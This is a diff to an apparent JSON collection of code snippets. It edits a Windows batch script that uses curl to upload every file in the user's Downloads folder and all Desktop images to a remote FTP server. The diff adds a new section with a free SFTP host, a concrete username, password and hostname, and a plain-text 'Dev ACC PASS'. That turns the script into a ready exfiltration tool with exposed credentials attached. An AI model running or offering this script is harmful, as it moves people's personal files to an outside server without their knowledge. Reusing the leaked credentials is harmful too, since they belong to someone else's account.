@@ -69,7 +69,10 @@
         "sections": [
           {
             "description": "For Online Server",
-            "code": "@echo off\nSET SRCONE=%USERPROFILE%\\Downloads\nSET SRCTWO=%USERPROFILE%\\Desktop\nSET FTP_USER=your_ftp_username\nSET FTP_PASS=your_ftp_password\nSET FTP_HOST=yourserver.com\nSET FTP_DEST=/public_html/uploaded_files/\necho Uploading Downloads...\nfor %%f in (\"%SRCONE%\\*.*\") do (echo Uploading %%~nxf & curl -T \"%%f\" -u %FTP_USER%:%FTP_PASS% ftp://%FTP_HOST%%FTP_DEST%)\necho Uploading Desktop Images...\nfor %%f in (\"%SRCTWO%\\*.png\" \"%SRCTWO%\\*.jpg\") do (echo Uploading %%~nxf & curl -T \"%%f\" -u %FTP_USER%:%FTP_PASS% ftp://%FTP_HOST%%FTP_DEST%)\necho.\necho ========================================\necho ✅ Upload complete!\necho Check your server: ftp://%FTP_HOST%%FTP_DEST%\necho ========================================\npause"
+            "code": "@echo off\nSET SRCONE=%USERPROFILE%\\Downloads\nSET SRCTWO=%USERPROFILE%\\Desktop\nSET FTP_USER=your_ftp_username\nSET FTP_PASS=your_ftp_password\nSET FTP_HOST=yourserver.com\nSET FTP_DEST=/upload/\necho Uploading Downloads...\nfor %%f in (\"%SRCONE%\\*.*\") do (echo Uploading %%~nxf & curl -T \"%%f\" -u %FTP_USER%:%FTP_PASS% ftp://%FTP_HOST%%FTP_DEST%)\necho Uploading Desktop Images...\nfor %%f in (\"%SRCTWO%\\*.png\" \"%SRCTWO%\\*.jpg\") do (echo Uploading %%~nxf & curl -T \"%%f\" -u %FTP_USER%:%FTP_PASS% ftp://%FTP_HOST%%FTP_DEST%)\necho.\necho ========================================\necho ✅ Upload complete!\necho Check your server: ftp://%FTP_HOST%%FTP_DEST%\necho ========================================\npause"
+          },{
+            "description": "Online Free Host <a href='https://sftpcloud.io/tools/free-ftp-server?utm_source=chatgpt.com' target='_blank'>Free FTP Server</a><br>Create Account > Then Create - New SFTP instance <br>...And Finally Get INFO <br>Dev ACC PASS : 4@qrLzZxiLNjTTr",
+            "code": "SET FTP_USER=ca2a947e33714d39a9035a87db49e99b\nSET FTP_PASS=qG1KDpWhdnoNldIO4CO3L4rP5YxX83pa\nSET FTP_HOST=eu-west-1.sftpcloud.io\nSET FTP_DEST=/upload/"
           }
         ]
       },{
